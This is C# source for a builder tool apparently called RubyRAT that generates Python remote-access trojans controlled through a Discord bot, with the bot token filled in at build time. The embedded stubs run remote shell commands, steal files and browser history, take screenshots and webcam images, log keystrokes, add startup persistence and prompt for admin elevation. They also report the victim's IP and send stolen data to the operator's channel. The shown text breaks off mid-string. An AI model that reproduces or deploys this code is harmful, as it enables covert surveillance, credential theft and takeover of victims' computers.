﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace RubyRAT_Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            InitializeComboBoxVersion();
        }

        private void InitializeComboBoxVersion()
        {
            // add versions to the ComboBox
            comboBoxVersions.Items.Add("1.4");
            comboBoxVersions.Items.Add("1.5");
            comboBoxVersions.Items.Add("1.6");
            comboBoxVersions.Items.Add("1.7");
            comboBoxVersions.Items.Add("1.8");
            comboBoxVersions.Items.Add("1.9");
            comboBoxVersions.Items.Add("1.9.5");
            comboBoxVersions.Items.Add("1.9.6");
            comboBoxVersions.Items.Add("2.0.0");
            comboBoxVersions.Items.Add("2.1.0");
            comboBoxVersions.Items.Add("2.2.0");
        }
        public string selectedVersion; // The version that user has selected of payload.

        private void comboBoxVersions_SelectedIndexChanged(object sender, EventArgs e)
        {
            selectedVersion = comboBoxVersions.SelectedItem.ToString();
        }

        public void OutputError(string OutputData)
        {
            string TextBefore = txtOutput.Text;
            string NewText = TextBefore + ("\r\n" + "ERROR: " + OutputData);
            txtOutput.Text = NewText;
        }

        public void OutputInfo(string OutputData)
        {
            string TextBefore = txtOutput.Text;
            string NewText = TextBefore + ("\r\n" + "INFO: " + OutputData);
            txtOutput.Text = NewText;
        }
        public void OutputScript(string OutputData)
        {
            string TextBefore = txtOutput.Text;
            OutputData = ConvertToSingleLine(OutputData);
            string NewText = TextBefore + ("\r\n" + "SCRIPT: " + OutputData);
            txtOutput.Text = NewText;
        }
        public void OutputWarning(string OutputData)
        {
            string TextBefore = txtOutput.Text;
            string NewText = TextBefore + ("\r\n" + "WARNING: " + OutputData);
            txtOutput.Text = NewText;
        }
        public void OutputClear()
        {
            txtOutput.Text = "";
        }

        
        public string GenerateStub(string DBT, string selectedVersion)
        {
            OutputClear();
            OutputInfo("Started Generating Payload...");
            OutputInfo("Selected Version is " + selectedVersion);
            string originalStub = "";
            if (selectedVersion == "1.4")
            {
                originalStub = "import discord\r\nimport os\r\nimport platform\r\nimport requests\r\nimport subprocess\r\nimport io\r\nimport psutil\r\nimport socket\r\nimport sys\r\nimport shutil\r\n\r\n# Check if running as executable\r\nrunning_as_executable = getattr(sys, 'frozen', False)\r\n\r\n# List of required modules\r\nrequired_modules = ['discord.py', 'pyautogui', 'opencv-python-headless']\r\n\r\n# Check and install required modules if needed\r\nif not running_as_executable:\r\n    missing_modules = []\r\n\r\n    for module in required_modules:\r\n        try:\r\n            __import__(module)\r\n        except ImportError:\r\n            missing_modules.append(module)\r\n\r\n    if missing_modules:\r\n        print(\"Some required modules are missing. Installing them...\")\r\n        try:\r\n            subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\"] + missing_modules)\r\n            print(\"Modules installed successfully!\")\r\n        except Exception as e:\r\n            print(\"An error occurred while installing modules:\", e)\r\n            exit(1)\r\n\r\n\r\nfrom discord.ext import commands\r\nimport pyautogui\r\nimport cv2\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\ncreated_channel = None  # To store the created channel object\r\n\r\n# Bool values to set settings:\r\ninstallOnStart = " + cbCTS.Checked + "\r\naskForUACOnStart = " + cbSE.Checked + "\r\n\r\nscript_path = os.path.abspath(__file__)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'Logged in as {bot.user.name}')\r\n\r\n    global created_channel  # Declare the global variable\r\n    system_username = os.getlogin()  # Get the system's username\r\n    guild = bot.guilds[0]  # Assuming the bot is in only one guild\r\n    category = discord.utils.get(guild.categories, name='RubyRAT')\r\n\r\n    if category is not None:\r\n        created_channel = await guild.create_text_channel(system_username, category=category)\r\n    else:\r\n        created_channel = await guild.create_text_channel(system_username)\r\n\r\n    # Get the public IP address using an external service\r\n    public_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']\r\n\r\n    # Send a message with the public IP address to the new channel\r\n    await created_channel.send(f\"Public IP Address of the client: {public_ip}. Btw Client is admin = {is_admin()} Also if you want to know more type **!help**\")\r\n\r\n@bot.command()\r\nasync def kill(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!kill':\r\n        await ctx.send(\"Disconnecting and removing chat channel...\")\r\n        if created_channel:\r\n            await created_channel.delete()\r\n        await bot.close()\r\n        os._exit(0)\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.author == bot.user:\r\n        return\r\n\r\n    if 'hey' in message.content.lower():\r\n        await message.channel.send('Hello!')\r\n\r\n    # Process !cmd messages\r\n    if message.channel == created_channel and message.content.startswith('!cmd'):\r\n        command_args = message.content.split(' ', 1)\r\n        if len(command_args) == 2:\r\n            output = CallME(command_args[1])\r\n            await message.channel.send(output)  # Send the output back to the chat\r\n\r\n    # Process !download messages\r\n    if message.channel == created_channel and message.content.startswith('!download'):\r\n        file_name = message.content.split(' ', 1)[1]\r\n        await DownloadFile(file_name, message.channel)\r\n\r\n    await bot.process_commands(message)\r\n\r\n\r\n# Customize the built-in help command\r\nbot.remove_command('help')  # Remove the default help command\r\n\r\n@bot.command(pass_context=True)\r\nasync def help(ctx):\r\n    help_message = (\r\n        \"**Available Commands:**\\n\"\r\n        \"`!cmd <command>` - Execute a shell command.\\n\"\r\n        \"`!download <filename>` - Download a file from the system.\\n\"\r\n        \"`!upload` - Upload a file to the bot.\\n\"\r\n        \"`!kill` - Disconnect the bot and remove the chat channel.\\n\"\r\n        \"`!screenshot` - Sends a frame of desktop from client to chat.\\n\"\r\n        \"`!webcam` - Takes a picture using clients webcam and sends it in chat.\\n\"\r\n        \"`!info` - Display some system information, such as GPU, CPU, RAM and more!.\\n\"\r\n        \"`!elevate` - Will try to elevate client from user to admin.\\n\"\r\n        \"`!install` - Try to get presisence on client system.\\n\"\r\n        \"`!uninstall` - Will remove presisence from client system.\\n\"\r\n        \"`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\\n\"\r\n    )\r\n    await ctx.send(help_message)\r\n\r\n@bot.command()\r\nasync def info(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!info':\r\n        system_info = get_system_info()\r\n        await ctx.send(f\"System Information:\\n```\\n{system_info}\\n```\")\r\n\r\n@bot.command()\r\nasync def screenshot(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!screenshot':\r\n        try:\r\n            # Capture the screenshot\r\n            screenshot = pyautogui.screenshot()\r\n\r\n            # Save the screenshot to a file\r\n            screenshot_path = 'screenshot.png'\r\n            screenshot.save(screenshot_path)\r\n\r\n            # Upload the screenshot to Discord\r\n            await ctx.send(file=discord.File(screenshot_path))\r\n            os.remove(screenshot_path)  # Remove the temporary file\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def webcam(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!webcam':\r\n        try:\r\n            # Capture an image from the webcam\r\n            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam\r\n            ret, frame = cap.read()\r\n            cap.release()\r\n\r\n            if ret:\r\n                # Save the captured image to a file\r\n                image_path = 'webcam_image.png'\r\n                cv2.imwrite(image_path, frame)\r\n\r\n                # Upload the image to Discord\r\n                await ctx.send(file=discord.File(image_path))\r\n                os.remove(image_path)  # Remove the temporary image file\r\n            else:\r\n                await ctx.send(\"Failed to capture image from webcam.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                            TEST ZONE STARTS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\nimport ctypes\r\nimport os\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                              TEST ZONE ENDS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\nimport subprocess\r\n\r\n@bot.command()\r\nasync def install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!install':\r\n        print(\"Received !install command\")\r\n        await ctx.send(\"Installing the bot on startup...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                        else:\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: {exe_link_path}\")\r\n\r\n                    await ctx.send(\"Bot installed on startup!\")\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    await ctx.send(f\"An error occurred while copying the script: {copy_error}\")\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            await ctx.send(f\"An error occurred while checking the operating system: {os_error}\")\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\n\r\n\r\n@bot.command()\r\nasync def uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!uninstall':\r\n        print(\"Received !uninstall command\")\r\n        await ctx.send(\"Uninstalling the bot...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n                batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n\r\n                # Remove the batch script and executable link\r\n                if os.path.exists(batch_script_path):\r\n                    os.remove(batch_script_path)\r\n                    print(f\"Batch script removed: {batch_script_path}\")\r\n                if os.path.exists(exe_link_path):\r\n                    os.remove(exe_link_path)\r\n                    print(f\"Executable link removed: {exe_link_path}\")\r\n\r\n                # Display a message indicating that persistence has been removed\r\n                await ctx.send(\"Bot persistence removed!\")\r\n                print(\"Bot persistence removed!\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while uninstalling: {e}\")\r\n            print(f\"An error occurred while uninstalling: {e}\")\r\n\r\n@bot.command()\r\nasync def elevate(ctx):\r\n    if is_admin():\r\n        return \"User has administrative privileges.\"\r\n    else:\r\n        return elevate_privileges()\r\n\r\n\r\n@bot.command()\r\nasync def cat(ctx, file_name):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            with open(file_name, 'r') as file:\r\n                file_content = file.read()\r\n                await ctx.send(f\"Content of '{file_name}':\\n```\\n{file_content}\\n```\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while reading the file: {e}\")\r\n\r\n@bot.command()\r\nasync def upload(ctx):\r\n    if ctx.channel == created_channel and ctx.message.attachments:\r\n        attachment = ctx.message.attachments[0]\r\n        await attachment.save(attachment.filename)\r\n        await ctx.send(f\"File '{attachment.filename}' uploaded successfully.\")\r\n\r\n\r\ndef has_persistence():\r\n    # Check if the bot has persistence using either the .py or .exe method\r\n    script_path = os.path.abspath(__file__)\r\n    startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n    batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n    exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n    \r\n    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')\r\n\r\n\r\ndef get_system_info():\r\n    try:\r\n        info = []\r\n        info.append(f\"System: {platform.system()}\")\r\n        info.append(f\"Node Name: {platform.node()}\")\r\n        info.append(f\"Release: {platform.release()}\")\r\n        info.append(f\"Version: {platform.version()}\")\r\n        info.append(f\"Machine: {platform.machine()}\")\r\n        info.append(f\"Processor: {platform.processor()}\")\r\n\r\n        # Memory information\r\n        memory = psutil.virtual_memory()\r\n        info.append(f\"Memory Total: {convert_bytes(memory.total)}\")\r\n        info.append(f\"Memory Available: {convert_bytes(memory.available)}\")\r\n        info.append(f\"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)\")\r\n\r\n        # Disk information\r\n        partitions = psutil.disk_partitions()\r\n        for partition in partitions:\r\n            partition_usage = psutil.disk_usage(partition.mountpoint)\r\n            info.append(f\"Disk {partition.device} ({partition.mountpoint}):\")\r\n            info.append(f\"  Total: {convert_bytes(partition_usage.total)}\")\r\n            info.append(f\"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)\")\r\n\r\n        # Additional system information\r\n        info.append(f\"Username: {os.getlogin()}\")\r\n        info.append(f\"Device Name: {platform.node()}\")\r\n        info.append(f\"IsAdmin: {is_admin()}\")\r\n        # Check if the bot has installed persistence (.py or .exe)\r\n        info.append(f\"Has Persistence: {has_persistence()}\")\r\n        private_ip = socket.gethostbyname(socket.gethostname())\r\n        info.append(f\"Private IP: {private_ip}\")\r\n\r\n        return '\\n'.join(info)\r\n    except Exception as e:\r\n        return f\"An error occurred while fetching system information: {e}\"\r\n\r\ndef convert_bytes(bytes_value):\r\n    # Convert bytes to human-readable format\r\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:\r\n        if bytes_value < 1024:\r\n            return f\"{bytes_value:.2f} {unit}\"\r\n        bytes_value /= 1024\r\n    return f\"{bytes_value:.2f} PB\"\r\n\r\ndef CallME(argument):\r\n    try:\r\n        result = subprocess.run(argument, shell=True, text=True, capture_output=True)\r\n        if result.returncode == 0:\r\n            return result.stdout\r\n        else:\r\n            return f\"Command exited with status code {result.returncode}.\\n{result.stderr}\"\r\n    except Exception as e:\r\n        return f\"An error occurred: {e}\"\r\n\r\nasync def DownloadFile(file_name, channel):\r\n    try:\r\n        with open(file_name, 'rb') as file:\r\n            file_content = file.read()\r\n            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))\r\n            await channel.send(f\"File '{file_name}' uploaded and available for download.\")\r\n    except Exception as e:\r\n        await channel.send(f\"An error occurred while uploading the file: {e}\")\r\n\r\n# check and ask for elevation\r\n# Function for trying to run the script elevated\r\ndef elevate_privileges():\r\n    try:\r\n        # Re-run the script with elevated privileges\r\n        ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\r\n        return \"Success! You should recive a new connection with a Elevated Client.\"\r\n    except Exception as e:\r\n        return f\"Failed to elevate privileges: {e}\"\r\n        sys.exit(1)\r\n\r\n# Function for getting if user is elevated or not\r\ndef is_admin():\r\n    try:\r\n        # Check if the current process has administrative privileges\r\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0\r\n    except:\r\n        return False\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                    SETTINGS STARTS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\n# The part that runs on start, asking for elevation.\r\nif askForUACOnStart:\r\n    if is_admin():\r\n        print(\"User has administrative privileges.\")\r\n    else:\r\n        print(\"User does not have administrative privileges.\")\r\n        elevate_privileges()\r\nelse:\r\n    print(\"Does not try to ask for UAC on start\")\r\n\r\n# Try to install on start or not..\r\nif installOnStart:\r\n    print(\"Trying to install on start...\")\r\nelse:\r\n    print(\"Does not install on start!\")\r\n\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                     SETTINGS ENDS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\nbot.run('" + DBT + "')";
            }
            else if (selectedVersion == "1.5")
            {
                originalStub = "import discord\r\nimport os\r\nimport platform\r\nimport subprocess\r\nimport io\r\nimport psutil\r\nimport socket\r\nimport sys\r\nimport shutil\r\nimport hashlib\r\nimport base64\r\nimport ctypes\r\nimport asyncio  # Import asyncio\r\nimport zipfile\r\n\r\n# Check if running as executable\r\nrunning_as_executable = getattr(sys, 'frozen', False)\r\n\r\n# List of required modules\r\nrequired_modules = ['discord', 'pyautogui', 'pynput', 'requests', 'psutil', 'cryptography']\r\n\r\n# Additional required module\r\nmissing_modules = []\r\n\r\nfor module in required_modules:\r\n    try:\r\n        __import__(module)\r\n    except ImportError as e:\r\n        print(f\"Error importing {module}: {e}\")\r\n        missing_modules.append(module)\r\n\r\n\r\n# Check and install required modules if needed\r\nif missing_modules:\r\n    print(\"Some required modules are missing. Installing them...\")\r\n    try:\r\n        subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\"] + missing_modules)\r\n        print(\"Modules installed successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while installing modules:\", e)\r\n        exit(1)\r\n\r\nfrom discord.ext import commands\r\nimport requests\r\nimport pyautogui\r\nfrom cryptography.fernet import Fernet, InvalidToken\r\nfrom pynput import keyboard\r\nfrom cryptography.fernet import Fernet, InvalidToken\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\n\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\ncreated_channel = None  # To store the created channel object\r\n\r\nis_logging = False\r\n\r\ninstallOnStart = " + cbCTS.Checked + "\r\naskForUACOnStart = " + cbSE.Checked + "\r\n\r\nscript_path = os.path.abspath(__file__)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'Logged in as {bot.user.name}')\r\n\r\n    # Create encryption key\r\n    key = Fernet.generate_key()\r\n    global cipher_suite\r\n    cipher_suite = Fernet(key)\r\n\r\n\r\n    global created_channel  # Declare the global variable\r\n    system_username = os.getlogin()  # Get the system's username\r\n    guild = bot.guilds[0]  # Assuming the bot is in only one guild\r\n    category = discord.utils.get(guild.categories, name='RubyRAT')\r\n\r\n    if category is not None:\r\n        created_channel = await guild.create_text_channel(system_username, category=category)\r\n    else:\r\n        created_channel = await guild.create_text_channel(system_username)\r\n\r\n    # Get the public IP address using an external service\r\n    public_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']\r\n\r\n    # Send a message with the public IP address to the new channel\r\n    await created_channel.send(f\"Public IP Address of the client: **{public_ip}**. Client is **admin = {is_admin()}**. Also if you want to know more type **!help**\")\r\n\r\n@bot.command()\r\nasync def kill(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!kill':\r\n        await ctx.send(\"Disconnecting and removing chat channel...\")\r\n        if created_channel:\r\n            await created_channel.delete()\r\n        await bot.close()\r\n        os._exit(0)\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.author == bot.user:\r\n        return\r\n\r\n    if 'hey' in message.content.lower():\r\n        await message.channel.send('Hello!')\r\n\r\n    # Process !cmd messages\r\n    if message.channel == created_channel and message.content.startswith('!cmd'):\r\n        command_args = message.content.split(' ', 1)\r\n        if len(command_args) == 2:\r\n            output = CallME(command_args[1])\r\n            await message.channel.send(output)  # Send the output back to the chat\r\n\r\n    # Process !download messages\r\n    if message.channel == created_channel and message.content.startswith('!download'):\r\n        file_name = message.content.split(' ', 1)[1]\r\n        await DownloadFile(file_name, message.channel)\r\n\r\n    await bot.process_commands(message)\r\n\r\n\r\n# Customize the built-in help command\r\nbot.remove_command('help')  # Remove the default help command\r\n\r\n@bot.command(pass_context=True)\r\nasync def help(ctx):\r\n    help_message = (\r\n        \"**Available Commands:**\\n\"\r\n        \"`!cmd <command>` - Execute a shell command.\\n\"\r\n        \"`!download <filename>` - Download a file from the system.\\n\"\r\n        \"`!upload` - Upload a file to the bot.\\n\"\r\n        \"`!kill` - Disconnect the bot and remove the chat channel.\\n\"\r\n        \"`!screenshot` - Sends a frame of desktop from client to chat.\\n\"\r\n        \"`!webcam` - Takes a picture using clients webcam and sends it in chat.\\n\"\r\n        \"`!info` - Display some system information, such as GPU, CPU, RAM and more!.\\n\"\r\n        \"`!elevate` - Will try to elevate client from user to admin.\\n\"\r\n        \"`!install` - Try to get presisence on client system.\\n\"\r\n        \"`!uninstall` - Will remove presisence from client system.\\n\"\r\n        \"`!history` - Gather and download all web history from client.\\n\"\r\n        \"`!volume <volume_procent>` - Changes volume to the given procentage.\\n\"\r\n        \"`!dump` - Sends a file containing the keyloggers log to C2.\\n\"\r\n        \"`!log` - Toggle keylogging.\\n\"\r\n        \"`!encrypt <filename> <password>` - Encrypt a file with a special password.\\n\"\r\n        \"`!decrypt <filename> <password>` - Decrypt a file with the special password.\\n\"\r\n        \"`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\\n\"\r\n    )\r\n    await ctx.send(help_message)\r\n\r\n@bot.command()\r\nasync def info(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!info':\r\n        system_info = get_system_info()\r\n        await ctx.send(f\"System Information:\\n```\\n{system_info}\\n```\")\r\n\r\n\r\n@bot.command()\r\nasync def screenshot(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!screenshot':\r\n        try:\r\n            # Capture the screenshot using pyautogui\r\n            screenshot = pyautogui.screenshot()\r\n\r\n            # Save the screenshot to a file\r\n            screenshot_path = 'screenshot.png'\r\n            screenshot.save(screenshot_path)\r\n\r\n            # Upload the screenshot to Discord\r\n            await ctx.send(file=discord.File(screenshot_path))\r\n            \r\n            # Remove the temporary file\r\n            os.remove(screenshot_path)\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n\r\n@bot.command()\r\nasync def webcam(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!webcam':\r\n        try:\r\n            # Capture an image from the webcam\r\n            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam\r\n            ret, frame = cap.read()\r\n            cap.release()\r\n\r\n            if ret:\r\n                # Save the captured image to a file\r\n                image_path = 'webcam_image.png'\r\n                cv2.imwrite(image_path, frame)\r\n\r\n                # Upload the image to Discord\r\n                await ctx.send(file=discord.File(image_path))\r\n                os.remove(image_path)  # Remove the temporary image file\r\n            else:\r\n                await ctx.send(\"Failed to capture image from webcam.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                            TEST ZONE STARTS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\n\r\n\r\ndef toggle_logging():\r\n    global is_logging\r\n    if is_logging:\r\n        stop_logging()\r\n        is_logging = False\r\n    else:\r\n        start_logging()\r\n        is_logging = True\r\n\r\n# Create a variable to store the logged keys\r\nlogged_keys = []\r\n\r\ndef on_key_press(key):\r\n    try:\r\n        logged_key = key.char\r\n    except AttributeError:\r\n        if key == keyboard.Key.space:\r\n            logged_key = \" \"\r\n        else:\r\n            logged_key = f\"[{str(key)}]\"\r\n\r\n    logged_keys.append(logged_key)\r\n\r\ndef start_logging():\r\n    global logged_keys\r\n    logged_keys = []\r\n    listener = keyboard.Listener(on_press=on_key_press)\r\n    listener.start()\r\n    print(\"Logging started...\")\r\n\r\ndef stop_logging():\r\n    listener.stop()\r\n    with open(\"keylog.txt\", \"w\") as logfile:\r\n        logfile.write(\"\".join(logged_keys))\r\n    print(\"Logging stopped. Keys saved to 'keylog.txt'\")\r\n\r\n\r\n@bot.command()\r\nasync def log(ctx):\r\n    toggle_logging()\r\n    if (is_logging):\r\n        await ctx.send(\"Logging started. Use **!dump** to see logs\")\r\n        return \"Logging started.\"\r\n    else:\r\n        await ctx.send(\"Logging stopped. Use **!dump** to see logs\")\r\n        return \"Logging stopped.\"\r\n\r\n@bot.command()\r\nasync def dump(ctx):\r\n    if ctx.channel == created_channel:\r\n        global logged_keys\r\n        if logged_keys:\r\n            # Join the logged keys into a string\r\n            log_text = \"\".join(logged_keys)\r\n            # Send the logged keys as a file attachment\r\n            with open(\"keylog.txt\", \"w\") as logfile:\r\n                logfile.write(log_text)\r\n            await ctx.send(\"Here are the logged keys:\", file=discord.File(\"keylog.txt\"))\r\n            # Delete the logfile\r\n            os.remove(\"keylog.txt\")\r\n        else:\r\n            await ctx.send(\"No keys have been logged yet.\")\r\n\r\n\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                              TEST ZONE ENDS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\ndef installNirsoft(zip_file_url, exe_file_name):\r\n    # Destination path for the downloaded .zip file\r\n    zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n    # Directory where you want to extract the .exe file\r\n    extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n    \r\n    # Check if the .zip file already exists, and if not, download it\r\n    if not os.path.exists(zip_download_path):\r\n        try:\r\n            # Download the .zip file\r\n            response = requests.get(zip_file_url)\r\n            with open(zip_download_path, 'wb') as file:\r\n                file.write(response.content)\r\n            print(f\".zip File downloaded to {zip_download_path}\")\r\n        except Exception as e:\r\n            print(f\".zip File download failed: {str(e)}\")\r\n\r\n    # Extract the .exe file from the .zip archive\r\n    try:\r\n        with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n            # Check if the .exe file exists in the archive\r\n            if exe_file_name in zip_ref.namelist():\r\n                zip_ref.extract(exe_file_name, extraction_directory)\r\n                exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                print(f\".exe File extracted to {exe_path}\")\r\n            else:\r\n                print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n    except Exception as e:\r\n        print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\ndef program_isInstalled(full_path_to_exe):\r\n    return os.path.exists(full_path_to_exe)\r\n\r\n\r\n@bot.command()\r\nasync def history(ctx):\r\n        # URL of the .zip file to download\r\n        zip_file_url = \"https://www.nirsoft.net/utils/browsinghistoryview.zip\"\r\n\r\n        # Destination path for the downloaded .zip file\r\n        zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n        # Directory where you want to extract the .exe file\r\n        extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n\r\n        # Command to execute after extracting the .exe file\r\n        command_to_execute = r'BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml \"C:\\Users\\Public\\history.html\"'\r\n\r\n        # Check if the .zip file already exists, and if not, download it\r\n        if not os.path.exists(zip_download_path):\r\n            try:\r\n                # Download the .zip file\r\n                response = requests.get(zip_file_url)\r\n                with open(zip_download_path, 'wb') as file:\r\n                    file.write(response.content)\r\n                await ctx.send(f\".zip File downloaded to {zip_download_path}\")\r\n                print(f\".zip File downloaded to {zip_download_path}\")\r\n            except Exception as e:\r\n                await ctx.send(f\".zip File download failed: {str(e)}\")\r\n                print(f\".zip File download failed: {str(e)}\")\r\n\r\n        # Extract the .exe file from the .zip archive\r\n        try:\r\n            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n                # Specify the name of the .exe file you want to extract\r\n                exe_file_name = \"BrowsingHistoryView.exe\"\r\n\r\n                # Check if the .exe file exists in the archive\r\n                if exe_file_name in zip_ref.namelist():\r\n                    zip_ref.extract(exe_file_name, extraction_directory)\r\n                    exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                    await ctx.send(f\".exe File extracted to {exe_path}\")\r\n                    print(f\".exe File extracted to {exe_path}\")\r\n                else:\r\n                    await ctx.send(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n                    print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"Extraction of .exe file failed: {str(e)}\")\r\n            print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\n        # Execute the command using the extracted .exe file\r\n        try:\r\n            subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)\r\n            success_message = \"Command executed successfully.\"\r\n            print(success_message)\r\n            await ctx.send(success_message)\r\n\r\n            # Send file to C2\r\n            await ctx.send(\"Sent file to C2\", file=discord.File(extraction_directory + \"\\history.html\"))\r\n\r\n            # Delete the archive (.zip) and the extracted .exe file\r\n            os.remove(extraction_directory + \"\\\\history.html\")\r\n            os.remove(zip_download_path)\r\n            os.remove(exe_path)\r\n            print(f\".zip, .html and .exe files deleted.\")\r\n            await ctx.send(f\".zip, .html and .exe files 